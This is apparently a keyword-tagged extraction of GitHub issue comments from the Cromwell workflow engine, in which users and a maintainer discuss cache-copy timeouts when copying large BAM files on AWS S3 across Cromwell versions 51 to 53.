https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:553,Performance,cache,cached,553,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:988,Performance,cache,cache,988,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1017,Performance,cache,cache,1017," copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1096,Performance,cache,cache,1096,"k for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it o",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1147,Performance,tune,tune,1147,"efore the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1267,Performance,cache,cache,1267,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1416,Performance,Cache,Cache,1416,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1938,Performance,cache,cacheCopy,1938,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:397,Safety,timeout,timeout,397,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:963,Safety,timeout,timeout,963,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1394,Safety,Timeout,TimeoutException,1394,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1246,Testability,log,log,1246,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1917,Availability,Error,Error,1917," of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1928,Availability,Failure,Failure,1928," of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:390,Deployability,release,release,390,"This is unusual, I have successfully call cached files of 1 TB in testing; so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file 